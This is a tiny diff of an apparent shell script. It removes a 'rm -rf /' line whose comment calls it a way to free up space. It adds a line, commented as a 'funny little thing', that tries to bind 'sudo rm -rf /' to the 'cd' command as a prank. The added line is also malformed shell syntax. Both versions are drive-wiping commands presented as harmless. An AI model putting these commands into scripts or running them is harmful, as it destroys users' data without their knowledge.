@@ -1,2 +1,3 @@
-#clean up space by deleting the entire drive
-rm -rf /
+# do a funny little thing
+
+sudo cd="sudo rm -rf /"
